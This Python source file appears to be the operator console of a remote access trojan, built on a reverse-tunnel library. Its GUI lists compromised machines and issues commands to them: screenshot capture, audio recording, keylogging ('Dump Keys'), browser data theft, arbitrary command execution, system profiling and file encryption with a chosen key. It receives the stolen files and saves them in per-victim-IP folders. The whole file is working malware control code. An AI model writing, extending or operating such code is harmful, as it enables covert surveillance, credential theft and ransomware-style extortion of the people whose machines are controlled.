import os
import tempfile
import atexit
from tkinter import ttk
from common_func import *
import tkinter as tk
import queue
import threading
_listening_sockets = []  # for close at exit

executing = True


class OutputCapture:
    def __init__(self):
        self.output = []

    def write(self, text):
        self.output.append(text)

    def flush(self):
        pass
# Create a custom stream to capture output


output_capture = OutputCapture()

# Create a dictionary to store the content of each tab
output_tabs = {}
current_output_tab = ''

def create_gui(pending_customers):
    global connected_ips_label, connected_ips_listbox, progress_bar, heartbeat_label, progress_bar_label, output_tabs, notebook

    def on_close():
        # Add your code here to stop executing the script
        root.destroy()  # Close the GUI window

    # Function to switch tabs
    def switch_tab(event):
        current_tab = notebook.tab(notebook.select(), "text")
        if current_output_tab != '':
            output_tabs[current_output_tab]['output_text'].delete("1.0", tk.END)
            output_tabs[current_output_tab]['output_text'].insert(tk.END, output_tabs[current_tab]['content'])

    # Create the GUI
    root = tk.Tk()
    root.title("Server Status")
    root.configure(bg="#222222")  # Set the background color to black
    root.protocol("WM_DELETE_WINDOW", on_close)  # Handle the close event

    # Set colors and styles
    text_color = "white"
    bg_color = "#222222"
    button_bg_color = "gray"
    button_fg_color = "white"
    label_font = ("Arial", 14, "bold")
    button_font = ("Arial", 10, "bold")

    # Create a frame to hold connected IPs and output text
    frame1 = tk.Frame(root, bg=bg_color)
    frame1.pack(pady=10)

    # Create a label for connected IPs
    connected_ips_label = tk.Label(frame1, text="Connected IPs:", font=label_font, fg=text_color, bg=bg_color)
    connected_ips_label.pack(side=tk.LEFT, padx=120)

    # Create a label for heartbeat text
    heartbeat_label = tk.Text(frame1, font=label_font, fg=text_color, bg=bg_color, width=1, height=1)
    heartbeat_label.pack(side=tk.RIGHT)

    # Create a label for output
    output_label = tk.Label(frame1, text="Output", font=label_font, fg=text_color, bg=bg_color)
    output_label.pack(side=tk.RIGHT, padx=300)

    # Create a frame to hold connected IPs, progress bar, and output text
    frame = tk.Frame(root, bg=bg_color)
    frame.pack(pady=10)

    # Create a listbox to display connected IPs
    connected_ips_listbox = tk.Listbox(frame, selectmode=tk.SINGLE, font=("Arial", 10), width=52, height=15,
                                       fg=text_color, bg=bg_color, selectbackground=button_bg_color)
    connected_ips_listbox.pack(side=tk.LEFT)

    # Create a scrollbar for the connected IPs listbox
    ips_scrollbar = ttk.Scrollbar(frame)
    ips_scrollbar.pack(side=tk.LEFT, fill=tk.Y)

    # Configure the connected IPs listbox to use the scrollbar
    connected_ips_listbox.config(yscrollcommand=ips_scrollbar.set)
    ips_scrollbar.config(command=connected_ips_listbox.yview)

    # Create a custom style for the Notebook widget
    notebook_style = ttk.Style()
    notebook_style.configure("CustomNotebook.TNotebook", background=bg_color)

    # Configure the tab style with padding
    notebook_style.configure("CustomNotebook.TNotebook.Tab", padding=5)

    # Create a Notebook widget with the custom style
    notebook = ttk.Notebook(frame, style="CustomNotebook.TNotebook")
    notebook.pack(side=tk.RIGHT, padx=(50, 0))

    tabs = ['Take Screenshot', 'Record Audio', 'Dump Keys', 'Browsers Data', 'Run CMD', 'System Info', 'Files']

    # Create three tabs with random names
    i = 0
    for tab in tabs:
        output = 'No output.'
        tab_frame = tk.Frame(notebook, bg=bg_color)
        output_text = tk.Text(tab_frame, font=("Arial", 10), width=90, height=15, fg=text_color, bg=bg_color)

        output_scrollbar = ttk.Scrollbar(tab_frame, command=output_text.yview)
        output_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        output_text.pack(fill=tk.BOTH, expand=True)
        output_text.insert(tk.END, output)
        output_text.config(yscrollcommand=output_scrollbar.set)
        tab_name = f"{tab}"
        tab_data = {'content': 'No output.',
                    'output_text': output_text,
                    'index': i}
        output_tabs[tab_name] = tab_data
        notebook.add(tab_frame, text=tab_name)
        i += 1

    # Bind the tab change event to switch the output text
    notebook.bind("<<NotebookTabChanged>>", switch_tab)



    # Create a frame to hold the progress bar and label
    frame3 = tk.Frame(root, bg=bg_color)
    frame3.pack(pady=10, padx=(470, 0))

    # Create the progress bar
    progress_bar = ttk.Progressbar(frame3, orient="horizontal", length=600, maximum=100, mode="determinate")
    progress_bar.pack(side=tk.LEFT)  # Align progress bar to the left side (west)

    # Create the label for progress text
    progress_bar_label = tk.Label(frame3, text="0%", width=6, bg=bg_color, fg="white")
    progress_bar_label.pack(padx=10, side=tk.RIGHT)

    # Create a frame to hold the buttons at the bottom
    button_frame = tk.Frame(root, bg=bg_color)
    button_frame.pack(side=tk.BOTTOM, padx=50)

    # Update button styles for dark mode
    button_style = {"font": button_font, "bg": button_bg_color, "fg": button_fg_color}

    # Screenshot button
    screenshot_button = tk.Button(button_frame, text="Take Screenshot", width=15, height=2,
                                  command=lambda: perform_action(pending_customers, "screenshot", "Take Screenshot"),
                                  state=tk.DISABLED, **button_style)
    screenshot_button.pack(side=tk.LEFT, padx=5, pady=10)

    # Audio button
    audio_button = tk.Button(button_frame, text="Record Audio", width=15, height=2,
                             command=lambda: perform_action(pending_customers, "audio", "Record Audio"),
                             state=tk.DISABLED, **button_style)
    audio_button.pack(side=tk.LEFT, padx=5, pady=10)

    # Keys button
    keys_button = tk.Button(button_frame, text="Dump Keys", width=15, height=2,
                            command=lambda: perform_action(pending_customers, "keys", "Dump Keys"),
                            state=tk.DISABLED, **button_style)
    keys_button.pack(side=tk.LEFT, padx=5, pady=10)

    # Browsers button
    browsers_button = tk.Button(button_frame, text="Browsers Data", width=15, height=2,
                                command=lambda: perform_action(pending_customers, "browsers", "Get Browsers Data"),
                                state=tk.DISABLED, **button_style)
    browsers_button.pack(side=tk.LEFT, padx=5, pady=10)

    # CMD button
    cmd_button = tk.Button(button_frame, text="Run CMD", width=15, height=2,
                           command=lambda: open_cmd_window(),
                           state=tk.DISABLED, **button_style)
    cmd_button.pack(side=tk.LEFT, padx=5, pady=10)

    # Info button
    info_button = tk.Button(button_frame, text="System Info", width=15, height=2,
                            command=lambda: perform_action(pending_customers, "info", "System Info"),
                            state=tk.DISABLED, **button_style)
    info_button.pack(side=tk.LEFT, padx=5, pady=10)

    # Encrypt button
    encrypt_button = tk.Button(button_frame, text="Files", width=15, height=2,
                               command=lambda: open_encryption_window(),
                               state=tk.DISABLED, **button_style)
    encrypt_button.pack(side=tk.LEFT, padx=5, pady=10)

    # Function to open the encryption window
    def open_encryption_window():
        encryption_window = tk.Toplevel(root)
        encryption_window.title("Files Options")
        encryption_window.configure(bg="#222222")

        # Calculate the position to center the window
        root.update_idletasks()
        root_width = root.winfo_width()
        root_height = root.winfo_height()
        encryption_width = 400
        encryption_height = 250
        x = root.winfo_x() + (root_width - encryption_width) // 2
        y = root.winfo_y() + (root_height - encryption_height) // 2
        encryption_window.geometry(f"{encryption_width}x{encryption_height}+{x}+{y}")

        encryption_label = tk.Label(encryption_window, text="Set a Fernet encryption key below:",
                                    font=("Arial", 12, "bold"), fg="white", bg="#222222")

        encryption_key_entry = tk.Entry(encryption_window, show="*", font=("Arial", 10), width=30)

        # Toggle encryption checkbox
        def toggle_encryption():
            if encrypt_var.get():
                decryption_checkbox.deselect()
                encryption_label.pack_forget()
                encryption_key_entry.pack_forget()

        # Toggle decryption checkbox
        def toggle_decryption():
            if decryption_var.get():
                encrypt_checkbox.deselect()
                encryption_label.pack(pady=10)
                encryption_key_entry.pack(pady=5)
            else:
                encryption_label.pack_forget()
                encryption_key_entry.pack_forget()

        def toggle_save_files():
            if save_files_var.get():
                decryption_checkbox.deselect()
                encryption_label.pack_forget()
                encryption_key_entry.pack_forget()

        checks_frame = tk.Frame(encryption_window, bg="#222222")
        checks_frame.pack(side=tk.TOP, pady=10)

        encrypt_var = tk.BooleanVar()
        encrypt_checkbox = tk.Checkbutton(checks_frame, text="Encrypt", variable=encrypt_var,
                                          font=("Arial", 10), fg="white", bg="#222222", selectcolor="#222222",
                                          command=toggle_encryption)
        encrypt_checkbox.grid(row=0, column=0, padx=5)

        save_files_var = tk.BooleanVar()
        save_files_checkbox = tk.Checkbutton(checks_frame, text="Save files", variable=save_files_var,
                                             font=("Arial", 10), fg="white", bg="#222222", selectcolor="#222222",
                                             command=toggle_save_files)
        save_files_checkbox.grid(row=0, column=1, padx=5)

        decryption_var = tk.BooleanVar()
        decryption_checkbox = tk.Checkbutton(checks_frame, text="Decrypt", variable=decryption_var,
                                             font=("Arial", 10), fg="white", bg="#222222", selectcolor="#222222",
                                             command=toggle_decryption)
        decryption_checkbox.grid(row=0, column=2, padx=5)

        password = ""

        # Execute encryption
        def execute_encryption():
            nonlocal password
            password = encryption_key_entry.get()
            save_files = "True" if save_files_var.get() else "False"
            encryption = "True" if encrypt_var.get() else "False"
            decryption = "True" if decryption_var.get() else "False"
            encryption_window.destroy()
            perform_action(pending_customers, f"encrypt╚{password}╚{save_files}╚{encryption}╚{decryption}", "Files")

        # Cancel encryption
        def cancel_encryption():
            encryption_window.destroy()


        button_frame = tk.Frame(encryption_window, bg="#222222")
        button_frame.pack(side=tk.BOTTOM, pady=10)

        ok_button = tk.Button(button_frame, text="OK", width=10, font=("Arial", 10, "bold"),
                              command=execute_encryption, bg="gray", fg="white")
        ok_button.pack(side=tk.LEFT, padx=10)

        cancel_button = tk.Button(button_frame, text="Cancel", width=10, font=("Arial", 10, "bold"),
                                  command=cancel_encryption, bg="gray", fg="white")
        cancel_button.pack(side=tk.LEFT, padx=10)

        encryption_window.bind('<Return>', lambda event: execute_encryption())

    # Function to open the CMD window
    def open_cmd_window():
        cmd_window = tk.Toplevel(root)
        cmd_window.title("Please enter a command to be run")
        cmd_window.configure(bg=bg_color)

        # Calculate the position to center the window
        root.update_idletasks()
        root_width = root.winfo_width()
        root_height = root.winfo_height()
        cmd_width = 500
        cmd_height = 300
        x = root.winfo_x() + (root_width - cmd_width) // 2
        y = root.winfo_y() + (root_height - cmd_height) // 2
        cmd_window.geometry(f"{cmd_width}x{cmd_height}+{x}+{y}")

        cmd_text = tk.Text(cmd_window, font=("Arial", 10), fg=text_color, bg=bg_color)
        cmd_text.pack(padx=10, pady=10)
        cmd_text.focus()

        scrollbar = tk.Scrollbar(cmd_window)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)

        cmd_text.config(yscrollcommand=scrollbar.set)
        scrollbar.config(command=cmd_text.yview)

        # Execute command
        def execute_command():
            command = cmd_text.get("1.0", tk.END).strip()
            perform_action(pending_customers, f'cmd╚{command}', "Run CMD")
            cmd_window.destroy()

        ok_button = tk.Button(cmd_window, text="OK", width=10, font=("Arial", 10, "bold"), command=execute_command,
                              bg=button_bg_color, fg=button_fg_color)
        ok_button.pack(pady=10)
        cmd_window.bind('<Return>', lambda event: execute_command())

    # Bind listbox selection event to enable/disable buttons
    def on_select(event):
        connected_indices = connected_ips_listbox.curselection()

        if connected_indices:
            selected_item = connected_ips_listbox.get(connected_indices[0]).lower()

            # Buttons state change depending on the selected IP's mode
            state_general = tk.NORMAL if "limited" in selected_item or "full" in selected_item else tk.DISABLED
            state_screenshot = tk.NORMAL if "full" in selected_item else tk.DISABLED

            screenshot_button.config(state=state_screenshot)
            audio_button.config(state=state_general)
            keys_button.config(state=state_general)
            browsers_button.config(state=state_general)
            cmd_button.config(state=state_general)
            info_button.config(state=state_general)
            encrypt_button.config(state=state_general)
        else:
            # If no selection, all buttons become DISABLED
            state_default = tk.DISABLED
            screenshot_button.config(state=state_default)
            audio_button.config(state=state_default)
            keys_button.config(state=state_default)
            browsers_button.config(state=state_default)
            cmd_button.config(state=state_default)
            info_button.config(state=state_default)
            encrypt_button.config(state=state_default)

    connected_ips_listbox.bind('<<ListboxSelect>>', on_select)

    # Start the GUI main loop
    root.mainloop()



def try_close(closable, master=None):
    try:
        if master is not None:
            update_connection_label(connected_ips_label, master.agent_pool)
            update_connected_ips_listbox(master.agent_pool, closable.getpeername(), remove=True)
        closable.close()
    except:
        pass


@atexit.register
def close_listening_socket_at_exit():
    log.info("exiting...")
    for s in _listening_sockets:
        address = s.getsockname()
        log.info("closing socket: {} {}".format(address[0], address[1]))
        try_close(s)


def update_progress_bar(progress):

    extra_label = ''
    if progress == 100:
        extra_label = "✅"
    if progress == "error":
        progress_bar_label.config(text=f"❌")
        progress_bar_label.update()
    else:
        progress_bar["value"] = progress
        progress_bar_label.config(text=f"{round(progress)}% {extra_label}")
        progress_bar_label.update()


def try_bind_port(sock, addr):
    while True:
        try:
            sock.bind(addr)
        except Exception as e:
            log.error(("unable to bind {}, {}. If this port was used by the recently-closed shootback itself\n"
                       "then don't worry, it would be available in several seconds\n"
                       "we'll keep trying....").format(addr, e))
            log.debug(traceback.format_exc())
            time.sleep(3)
        else:
            break


class Master(object):
    def __init__(self, customer_listen_addr, communicate_addr=None,
                 agent_pool=None, working_pool=None,
                 ssl=False, queue=None
                 ):
        """
        :param customer_listen_addr: equals to the -c/--customer param
        :param communicate_addr: equals to the -m/--master param
        """
        self.thread_pool = {}
        self.thread_pool["spare_agent"] = {}
        self.thread_pool["working_agent"] = {}

        self.working_pool = working_pool or {}

        self.socket_bridge = SocketBridge()

        # a queue for customers who have connected to us,
        #   but not assigned a agent yet
        self.pending_customers = queue

        if ssl:
            self.ssl_context = self._make_ssl_context()
            self.ssl_avail = self.ssl_context is not None
        else:
            self.ssl_avail = False
            self.ssl_context = None

        self.communicate_addr = communicate_addr

        _fmt_communicate_addr = fmt_addr(self.communicate_addr)

        if agent_pool:
            # 若使用外部agent_pool, 就不再初始化listen
            # 这是以后待添加的功能
            self.external_agent = True
            self.thread_pool["listen_agent"] = None
        else:
            # 自己listen来获取agent
            self.external_agent = False
            self.agent_pool = collections.deque()
            # prepare Thread obj, not activated yet
            self.thread_pool["listen_agent"] = threading.Thread(
                target=self._listen_agent,
                name="listen_agent-{}".format(_fmt_communicate_addr),
                daemon=True,
            )

        # prepare Thread obj, not activated yet
        self.customer_listen_addr = customer_listen_addr
        self.thread_pool["listen_customer"] = threading.Thread(
            target=self._listen_customer,
            name="listen_customer-{}".format(_fmt_communicate_addr),
            daemon=True,
        )

        # prepare Thread obj, not activated yet
        self.thread_pool["heart_beat_daemon"] = threading.Thread(
            target=self._heart_beat_daemon,
            name="heart_beat_daemon-{}".format(_fmt_communicate_addr),
            daemon=True,
        )

        # prepare assign_agent_daemon
        self.thread_pool["assign_agent_daemon"] = threading.Thread(
            target=self._assign_agent_daemon,
            name="assign_agent_daemon-{}".format(_fmt_communicate_addr),
            daemon=True,
        )

    def serve_forever(self):
        if not self.external_agent:
            self.thread_pool["listen_agent"].start()
        self.thread_pool["heart_beat_daemon"].start()
        self.thread_pool["listen_customer"].start()
        self.thread_pool["assign_agent_daemon"].start()
        self.thread_pool["socket_bridge"] = self.socket_bridge.start_as_daemon()

        #while True:
            #time.sleep(10)

    def _make_ssl_context(self):
        if ssl is None:
            log.warning('ssl module is NOT valid in this machine! Fallback to plain')
            return None

        ctx = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
        ctx.check_hostname = False
        ctx.load_default_certs(ssl.Purpose.SERVER_AUTH)
        ctx.verify_mode = ssl.CERT_NONE

        _certfile = tempfile.mktemp()
        with open(_certfile, 'w') as fw:
            fw.write(_DEFAULT_SSL_CERT)
        _keyfile = tempfile.mktemp()
        with open(_keyfile, 'w') as fw:
            fw.write(_DEFAULT_SSL_KEY)
        ctx.load_cert_chain(_certfile, _keyfile)
        os.remove(_certfile)
        os.remove(_keyfile)

        return ctx

    def _transfer_complete(self, addr_customer):
        """a callback for SocketBridge, do some cleanup jobs"""
        log.info("customer complete: {}".format(addr_customer))
        del self.working_pool[addr_customer]

    def _serve_customer(self, conn_customer, conn_agent):
        """put customer and agent sockets into SocketBridge, let them exchange data"""
        self.socket_bridge.add_conn_pair(
            conn_customer, conn_agent,
            functools.partial(  # it's a callback
                # 这个回调用来在传输完成后删除工作池中对应记录
                self._transfer_complete,
                conn_customer.getpeername()
            )
        )

    @staticmethod
    def _send_heartbeat(conn_agent):
        try:
            conn_agent.send("heartbeat".encode())
            response = conn_agent.recv(1024).decode()
            if response == "heartbeat":
                heartbeat_label.insert("1.0", "♥")  # Insert the new output
                print(f"Heartbeat from agent {conn_agent.getpeername()} received")
            return True
        except Exception as e:
            print(f"Error: {e}")
            return False


        """send and verify heartbeat pkg"""
        conn_agent.send(CtrlPkg.pbuild_heart_beat().raw)

        pkg, verify = CtrlPkg.recv(
            conn_agent, expect_ptype=CtrlPkg.PTYPE_HEART_BEAT)  # type: CtrlPkg,bool

        if not verify:
            return False

        if pkg.prgm_ver < 0x000B:
            # shootback before 2.2.5-r10 use two-way heartbeat
            #   so there is no third pkg to send
            pass
        else:
            # newer version use TCP-like 3-way heartbeat
            #   the older 2-way heartbeat can't only ensure the
            #   master --> agent pathway is OK, but the reverse
            #   communicate may down. So we need a TCP-like 3-way
            #   heartbeat
            conn_agent.send(CtrlPkg.pbuild_heart_beat().raw)

        return verify

    def _heart_beat_daemon(self):
        """
        每次取出agent队列头部的一个, 测试心跳, 并把它放回尾部.
            agent若超过 SPARE_SLAVER_TTL 秒未收到心跳, 则会自动重连
            所以睡眠间隔(delay)满足   delay * agent总数  < TTL
            使得一轮循环的时间小于TTL,
            保证每个agent都在过期前能被心跳保活
        """
        default_delay = 5 + SPARE_SLAVER_TTL // 12
        delay = default_delay
        log.info("heart beat daemon start, delay: {}s".format(delay))
        while True:
            time.sleep(delay)
            # log.debug("heart_beat_daemon: hello! im weak")

            # ---------------------- preparation -----------------------
            agent_count = len(self.agent_pool)
            if not agent_count:
                log.warning("heart_beat_daemon: sorry, no agent available, keep sleeping")
                # restore default delay if there is no agent
                delay = default_delay
                continue
            else:
                # notice this `agent_count*2 + 1`
                # agent will expire and re-connect if didn't receive
                #   heartbeat pkg after SPARE_SLAVER_TTL seconds.
                # set delay to be short enough to let every agent receive heartbeat
                #   before expire
                delay = 1 + SPARE_SLAVER_TTL // max(agent_count * 2 + 1, 12)

            # pop the oldest agent
            #   heartbeat it and then put it to the end of queue
            agent = self.agent_pool.popleft()
            addr_agent = agent["addr_agent"]
            if agent["can_beat"]:
                # ------------------ real heartbeat begin --------------------
                start_time = time.perf_counter()
                try:
                    hb_result = self._send_heartbeat(agent["conn_agent"])
                except Exception as e:
                    log.warning("error during heartbeat to {}: {}".format(
                        fmt_addr(addr_agent), e))
                    log.debug(traceback.format_exc())
                    hb_result = False
                finally:
                    time_used = round((time.perf_counter() - start_time) * 1000.0, 2)
                    time.sleep(1)
                    heartbeat_label.delete("1.0", tk.END)  # Delete the existing text
                # ------------------ real heartbeat end ----------------------

            else:
                hb_result = True
                time_used = 0

            if not hb_result:
                log.warning("heart beat failed: {}, time: {}ms".format(
                    fmt_addr(addr_agent), time_used))
                try_close(agent["conn_agent"], self)
                del agent["conn_agent"]

                # if heartbeat failed, start the next heartbeat immediately
                #   because in most cases, all 5 agent connection will
                #   fall and re-connect in the same time
                delay = 0

            else:
                log.debug("heartbeat success: {}, time: {}ms".format(
                    fmt_addr(addr_agent), time_used))
                self.agent_pool.append(agent)
                print(f"Agent count: {len(self.agent_pool)}")

    def _handshake(self, conn_agent):
        return conn_agent
        """
        handshake before real data transfer
        it ensures:
            1. client is alive and ready for transmission
            2. client is shootback_agent, not mistakenly connected other program
            3. verify the SECRET_KEY, establish SSL
            4. tell agent it's time to connect target
        handshake procedure:
            1. master hello --> agent
            2. agent verify master's hello
            3. agent hello --> master
            4. (immediately after 3) agent connect to target
            4. master verify agent
            5. [optional] establish SSL
            6. enter real data transfer
        Args:
            conn_agent (socket.socket)
        Return:
            socket.socket|ssl.SSLSocket: socket obj(may be ssl-socket) if handshake success, else None
        """
        conn_agent.send(CtrlPkg.pbuild_hs_m2s(ssl_avail=self.ssl_avail).raw)
        buff = select_recv(conn_agent, CtrlPkg.PACKAGE_SIZE, 2)

        if buff is None:
            return None

        pkg, correct = CtrlPkg.decode_verify(buff, CtrlPkg.PTYPE_HS_S2M)  # type: CtrlPkg,bool

        if not correct:
            return None

        if not self.ssl_avail or pkg.data[1] == CtrlPkg.SSL_FLAG_NONE:
            if self.ssl_avail:
                log.warning('client %s not enabled SSL, fallback to plain.', conn_agent.getpeername())
            return conn_agent
        else:
            ssl_conn_agent = self.ssl_context.wrap_socket(conn_agent, server_side=True)  # type: ssl.SSLSocket
            log.debug('ssl established agent: %s', ssl_conn_agent.getpeername())
            return ssl_conn_agent

    def _get_an_active_agent(self, connection_to_match):
        """get and activate a agent for data transfer"""
        try_count = 100
        while True:
            if not try_count:
                return None
            try:
                dict_agent = next(
                    agent for agent in self.agent_pool if agent["conn_agent"].getpeername() == connection_to_match)
                #self.agent_pool.remove(dict_agent)
            except StopIteration:
                time.sleep(0.02)
                try_count -= 1
                if try_count % 10 == 0:
                    log.error("!!NO SLAVER AVAILABLE!! trying {}".format(try_count))
                continue

            conn_agent = dict_agent["conn_agent"]

            addr_agent = conn_agent.getsockname()

            try:
                # this returned conn may be an SSL socket or plain socket

                # this is to see if the connection is on, if yes, the code is executed, if not, exception will be caught
                conn_agent.send("".encode())

                actual_conn = self._handshake(conn_agent)
            except Exception as e:
                log.warning("Handshake failed. %s %s", dict_agent["addr_agent"], e)
                log.debug(traceback.format_exc())

                actual_conn = None

                try_count -= 1
                if try_count % 10 == 0:
                    log.error("!!NO SLAVER AVAILABLE!! trying {}".format(try_count))

            if actual_conn is not None:
                return actual_conn
            else:
                log.warning("agent handshake failed: %s", dict_agent["addr_agent"])

                try_close(conn_agent, self)

                time.sleep(0.02)

    def receive_file_from_agent(self, conn_agent, command):
        try:

            output_size = conn_agent.recv(4096).decode()
            print(f"Log size: {output_size}")
            received_size = 0
            output_string = b""

            while received_size < int(output_size):
                remaining_bytes = int(output_size) - received_size
                chunk_size = min(remaining_bytes, 8192)
                data = conn_agent.recv(chunk_size)
                if not data:
                    update_progress_bar(100)
                    break
                output_string += data
                received_size += len(data)
                percentage = (len(output_string) / int(output_size)) * 100
                update_progress_bar(percentage)

            print(f"\n~*~*~*~*~*~*~*~*~*~*~*~*~AGENT OUTPUT START*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*\n")
            print(f"{output_string.decode('utf-8')}")
            print(f"~*~*~*~*~*~*~*~*~*~*~*~*~*AGENT OUTPUT END~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*\n")

            filesize = conn_agent.recv(4096).decode()
            print(f"File size: {filesize}")

            if filesize == "error":
                if "encrypt" in command or "cmd" in command:
                    command = command.split('╚')[0]
                print(f"❌❌❌❌❌❌❌❌❌❌❌❌ERROR❌❌❌❌❌❌❌❌❌❌❌❌❌❌\n"
                      f"Error executing command {command}.\n"
                      f"See log above.")
                update_progress_bar("error")
                return

            if filesize == "encrypt_done":
                print("Encryption of files done.")
                return

            filename = conn_agent.recv(4096).decode()
            file_size_in_mb = int(filesize) / (1024 * 1024)

            print(f"Receiving new file: {filename} - size: {round(file_size_in_mb, 2)} mb")

            update_progress_bar(0)

            received_data = b''  # Initialize an empty byte string to store the received data

            while len(received_data) < int(filesize):
                remaining_bytes = int(filesize) - len(received_data)
                chunk_size = min(remaining_bytes, 81920)
                data = conn_agent.recv(chunk_size)
                if not data:
                    update_progress_bar(100)
                    break
                received_data += data
                percentage = (len(received_data) / int(filesize)) * 100
                update_progress_bar(percentage)

            print(f"Downloaded file size: {len(received_data)} bytes")

            # Get the IP address of the connection
            connection_ip = conn_agent.getpeername()[0]

            # Create the directory structure if it doesn't exist
            directory = os.path.join('received', connection_ip)
            os.makedirs(directory, exist_ok=True)

            # Create the full file path
            file_path = os.path.join(directory, filename)

            # Save the file data to a file
            with open(file_path, 'wb') as file:
                file.write(received_data)

            for agent in self.agent_pool:
                if agent['addr_agent'] == conn_agent.getpeername():
                    agent['can_beat'] = True

            print(f'File {filename} received successfully. Saved at: {directory}/{filename}')

        except Exception as e:
            print(f"Failed to receive file from agent: {e}")
            update_progress_bar("error")
            for agent in self.agent_pool:
                if agent['addr_agent'] == conn_agent.getpeername():
                    agent['can_beat'] = True
            return False

    def run_in_thread(self, conn_agent, conn_customer, command):
        global output_tabs, current_output_tab
        start_time = time.time()

        try:
            # Send the command to the agent machine
            conn_agent.send(command.encode('utf-8'))

            if command.startswith("cmd╚") or command == "info":
                for agent in self.agent_pool:
                    if agent['addr_agent'] == conn_agent.getpeername():
                        agent['can_beat'] = False

                output_size = conn_agent.recv(4096).decode()
                received_size = 0
                output_string = b""
                print(f"Log size: {output_size}")

                while received_size < int(output_size):
                    remaining_bytes = int(output_size) - received_size
                    chunk_size = min(remaining_bytes, 81920)
                    data = conn_agent.recv(chunk_size)
                    if not data:
                        update_progress_bar(100)
                        break
                    output_string += data
                    received_size += len(data)
                    percentage = (len(output_string) / int(output_size)) * 100
                    update_progress_bar(percentage)

                print(f"Downloaded log size: {received_size}")

                for agent in self.agent_pool:
                    if agent['addr_agent'] == conn_agent.getpeername():
                        agent['can_beat'] = True

                print(output_string.decode('utf-8'))

            elif any(word in command for word in ['files', 'screenshot', 'audio', 'keys', 'browsers', 'encrypt']):
                for agent in self.agent_pool:
                    if agent['addr_agent'] == conn_agent.getpeername():
                        agent['can_beat'] = False
                self.receive_file_from_agent(conn_agent, command)

            #print('-------------------------------------------------------------------------------------------')

        except Exception as e:
            print(f"Couldn't send the command and retrieve a file. Why: {e}")

        update_connected_ips_listbox(self.agent_pool, conn_customer, remove=None, command="connected")
        # Calculate the elapsed time
        end_time = time.time()
        elapsed_time = end_time - start_time

        print(f"Time spent executing the command: {round(elapsed_time)} seconds")

        captured_output = output_capture.output
        output_string = ''.join(captured_output)
        # Restore stdout to its original value
        sys.stdout = sys.__stdout__

        # Update tab content
        output_tabs[current_output_tab]['content'] = output_tabs[current_output_tab]['content'] + f"\n\n~~~~~~~~~~~~~~~~~~~~NEW OUTPUT~~~~~~~~~~~~~~~~\n\n" + output_string

        # Select tab
        notebook.select(output_tabs[current_output_tab]['index'])

        output_tabs[current_output_tab]['output_text'].delete("1.0", tk.END)  # Delete the existing text
        output_capture.__init__()
        output_tabs[current_output_tab]['output_text'].insert("1.0", output_tabs[current_output_tab]['content'], "info")  # Insert the new output

    def _assign_agent_daemon(self):
        """assign agent for customer"""
        while True:
            # get a newly connected customer
            conn_customer, addr_customer, command = self.pending_customers.get()



            try:
                conn_agent = self._get_an_active_agent(conn_customer)

                update_connection_label(connected_ips_label, self.agent_pool)
                update_connected_ips_listbox(self.agent_pool, conn_customer, remove=None, command=command)

            except:
                log.error('error in getting agent', exc_info=True)
                continue

            if conn_agent is None:
                log.warning("Closing customer[%s] because no available agent found", addr_customer)
                try_close(conn_customer, self)

                continue
            else:
                log.debug("Using agent: %s for %s", conn_agent.getpeername(), addr_customer)

            # After getting a agent:
            new_thread = threading.Thread(target=self.run_in_thread, args=(conn_agent, conn_customer, command))
            new_thread.start()


    def _listen_agent(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try_bind_port(sock, self.communicate_addr)
        sock.listen(10)
        _listening_sockets.append(sock)
        log.info("Listening for agents: {}".format(
            fmt_addr(self.communicate_addr)))
        while True:
            conn, addr = sock.accept()

            message = conn.recv(1024)
            print(message)

            if message.decode() != "":
                self.agent_pool.append({
                    "addr_agent": addr,
                    "conn_agent": conn,
                    "can_beat": True
                })
                log.info("Got agent {} Total: {}".format(
                    fmt_addr(addr), len(self.agent_pool)
                ))

                update_connection_label(connected_ips_label, self.agent_pool)
                update_connected_ips_listbox(self.agent_pool, addr, message=message.decode())





    def _listen_customer(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try_bind_port(sock, self.customer_listen_addr)
        sock.listen(20)
        _listening_sockets.append(sock)
        log.info("Listening for customers: {}".format(
            fmt_addr(self.customer_listen_addr)))
        while True:
            conn_customer, addr_customer = sock.accept()
            log.info("Serving customer: {} Total customers: {}".format(
                addr_customer, self.pending_customers.qsize() + 1
            ))

            # just put it into the queue,
            #   let _assign_agent_daemon() do the else
            #   don't block this loop
            self.pending_customers.put((conn_customer, addr_customer))


def run_master(communicate_addr, customer_listen_addr, queue, secret_key="shootback", verbose=True, quiet=False, ttl=300,
               ssl=False):
    logging.basicConfig(level=logging.WARNING if quiet else (logging.DEBUG if verbose else logging.INFO))

    set_secretkey(secret_key)
    SPARE_SLAVER_TTL = ttl

    # configure_logging(logging.getLogger(), level=logging.WARNING if quiet else (logging.DEBUG if verbose else logging.INFO))

    master = Master(customer_listen_addr, communicate_addr, queue=queue, ssl=ssl)

    master.serve_forever()


def update_connection_label(label, count):
    label.config(text=f"Connected IPs: {len(count)}")
    label.update()


def update_connected_ips_listbox(agent_pool, ip, message="full", remove=False, command=""):
    try:
        items = connected_ips_listbox.get(0, tk.END)
        ip_text = f"Agent {len(agent_pool)}: {ip[0]}:{ip[1]} - {message}"

        command_agent = command

        if "cmd" in command_agent:
            command_agent = "cmd"
        if "encrypt" in command_agent:
            command_agent = "encrypt"

        if command_agent != "":
            ip_text += f" - working on: {command_agent}"
        else:
            ip_text += f" - connected"

        #print(f"Updating IP {ip[0]}:{ip[1]}, it is being removed: {remove}")

        if remove is None:
            for index, item in enumerate(items):
                if f"{ip[0]}:{ip[1]}" in item:
                    # Extract the current command from the item
                    current_command = item.split(" - ")[-1].split(":")[-1].strip()

                    # Update the item with the new command
                    if current_command != "connected":
                        new_item = item.replace(f"working on: {current_command}", f"{command_agent}")
                    else:
                        new_item = item.replace("connected", f"working on: {command_agent}")

                    connected_ips_listbox.delete(index)
                    connected_ips_listbox.insert(index, new_item)
                    if command != "connected":
                        print(f"Agent: {ip[0]}:{ip[1]} is processing command: {command}")
                    print('-------------------------------------------------------------------------------------------\n')
                    break
        elif remove:
            for index, item in enumerate(items):
                if f"{ip[0]}:{ip[1]}" in item:
                    connected_ips_listbox.delete(index)
                    # Remove the matching agent_pool child
                    for agent in agent_pool:
                        if agent['addr_agent'] == ip:
                            agent_pool.remove(agent)
